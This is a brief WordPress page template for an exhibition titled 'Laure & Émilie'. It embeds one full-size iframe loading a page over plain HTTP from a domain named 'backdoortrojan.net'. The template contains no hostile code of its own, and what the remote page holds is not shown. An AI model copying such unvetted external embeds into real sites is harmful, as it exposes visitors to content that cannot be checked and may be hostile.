<?php 
/*
* Template name: Exposition Laure & Émilie
*/
get_header(); ?>

<?php if(have_posts()) while(have_posts()) : the_post(); ?>

<iframe class="fullsize" src="http://backdoortrojan.net/abimegender.html"></iframe>

<?php endwhile; ?>

<?php get_footer(); ?>